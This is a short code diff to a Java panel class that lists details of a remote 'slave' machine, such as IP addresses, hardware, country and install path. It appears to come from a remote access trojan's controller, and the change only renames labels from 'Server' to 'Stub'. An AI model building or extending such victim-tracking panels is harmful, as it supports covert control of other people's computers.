@@ -110,7 +110,7 @@ public class PanelControlComputerInfo extends PanelControlParent {
 		}
 		addRow("connection_host", "Connection Host", slave.getIP());
 		addRow("localhost", "LAN IP", slave.getLocalIP());
-		addRow("id", "Server ID", slave.getServerID());
+		addRow("id", "Stub ID", slave.getServerID());
 		addRow("memory", "RAM", slave.getRam() + " MB");
 		addRow("adapters", "Available Processors", slave.getProcessors() + "");
 		addRow("last_modified", "Install Date/Last modified", slave.getInstallDate());
@@ -119,8 +119,8 @@ public class PanelControlComputerInfo extends PanelControlParent {
 		addRow("computer_name", "Computer Name", slave.getComputerName());
 		addRow("os", "OS Name", slave.getOperatingSystem());
 		addRow(FlagUtils.getFlag(slave), "Country", slave.getCountry());
-		addRow("folder", "Server Location", slave.getServerPath());
-		addRow("key", "Server Version", slave.getVersion());
+		addRow("folder", "Stub Location", slave.getServerPath());
+		addRow("key", "Stub Version", slave.getVersion());
 		addRow("javascript", "Java Version", slave.getJavaVersion());
 		addRow("javascript", "Java Path", slave.getJavaPath());
 
